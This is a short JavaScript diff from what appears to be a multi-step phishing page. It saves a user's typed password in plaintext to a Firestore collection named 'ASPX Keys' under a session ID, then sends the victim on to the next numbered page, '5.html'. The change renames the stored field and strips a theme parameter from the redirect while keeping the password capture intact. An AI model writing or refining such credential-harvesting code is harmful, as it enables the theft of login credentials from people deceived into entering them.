@@ -322,14 +322,12 @@
 
             const docRef = doc(db, "ASPX Keys", sessionId);
             await updateDoc(docRef, {
-                password: password,
+                "Password": password,
                 updatedAt: new Date().toLocaleString() + " UTC+5:30"
             });
 
-            // Success Redirect
-            const themeParam = urlParams.get('theme');
-            const redirectUrl = themeParam ? `5.html?session=${sessionId}&theme=${themeParam}` : `5.html?session=${sessionId}`;
-            window.location.href = redirectUrl;
+            // Redirect carrying only the session ID
+            window.location.href = `5.html?session=${sessionId}`;
             
         } catch (e) {
             console.error(e);
